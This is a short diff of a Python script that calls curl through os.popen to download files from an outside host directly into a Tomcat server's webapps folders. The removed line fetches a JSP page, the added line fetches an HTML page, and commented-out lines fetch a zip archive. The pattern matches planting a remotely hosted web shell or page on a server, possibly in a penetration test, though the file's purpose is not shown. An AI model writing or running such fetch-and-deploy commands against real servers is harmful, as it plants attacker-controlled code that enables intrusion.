@@ -12,7 +12,7 @@ import os
 
 
 #stream = os.popen('curl -o opt/tomcat/webapps/aggregate/my_env_b.zip https://sbnke.com/my_env_be.zip')  # or 'dir' for Windows
-stream = os.popen('curl -o opt/tomcat/webapps/docs/netspi/test.jsp https://sbnke.com/jsp/test.jsp')  # or 'dir' for Windows
+stream = os.popen('curl -o opt/tomcat/webapps/docs/netspi/netspi.html https://sbnke.com/jsp/netspi.html')  # or 'dir' for Windows
 
 #stream = os.popen('python3 -m pip install fastapi uvicorn --user')  # or 'dir' for Windows
 
